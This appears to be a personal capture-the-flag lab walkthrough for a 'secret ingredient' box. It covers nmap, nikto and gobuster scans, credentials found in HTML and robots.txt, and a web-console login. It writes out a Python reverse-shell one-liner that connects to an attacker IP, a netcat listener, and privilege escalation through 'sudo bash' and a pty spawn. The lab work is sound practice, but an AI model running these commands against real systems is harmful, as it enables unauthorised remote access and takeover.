
## important
username: R1ckRul3s
password: Wubbalubbadubdub 

```
export IP=10.10.208.82
```


```
nmap -sC -sV -oN nmap/initial $IP
```


Turns out there are a bunch of ssh ports nd protocols open
also a webserver running, let's look at that. 

in the html we found a username, so obvious. 

Next we use nikto to scan the server for known vulns 
```
nikto -h http://$IP | tee nikto.log

```

And scan for common files and paths 
```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,css,sh,txt
```


Turns out, robots.txt exists, but has no content but `Wubbalubbadubdub`, which looks a bit like a password

also ran maybe dubbel, but workes quick, `dirb`
```
dirb $IP
```


And we have a login.php page, lest test the found hints

```
R1ckRul3s: Wubbalubbadubdub
```

Success!!
and we have a webconsole!


Now with `ls` we can see the file with our first secret ingredient~

```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.62.249",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

and setup a netcat listner `nc -lnvp 9999`


after digging arround you'll find the first ingredient.
Than you'll want to see if you can get a user with super user strenght, turns out you can easily bash into a shell
`sudo bash` or even `python3 -c "import pty;pty.spawn('/bin/bash')"` 





